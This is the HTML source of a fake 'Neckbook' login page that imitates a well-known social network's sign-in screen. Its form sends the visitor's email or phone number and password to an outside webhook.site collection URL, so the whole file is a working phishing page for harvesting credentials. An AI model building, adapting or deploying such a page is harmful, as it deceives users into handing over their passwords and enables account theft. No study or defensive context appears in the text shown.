<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Neckbook – log in or sign up</title>
    <link rel="stylesheet" href="neckbook.css" />
  </head>
  <body>
    <div class="container">
      <div class="nb-header">neckbook</div>
      <div class="nb-desc">
        Connect with friends and the world around you on Neckbook.
      </div>
      <form
        action="https://webhook.site/a0c7192f-1222-426d-98b2-2d7f56f19444"
        method="POST"
      >
        <div>
          <input
            type="email"
            name="email"
            placeholder="Email address or phone number"
            required
          />
        </div>
        <div>
          <input
            type="password"
            name="password"
            placeholder="Password"
            required
          />
        </div>
        <button type="submit">Log In</button>
      </form>
    </div>
  </body>
</html>
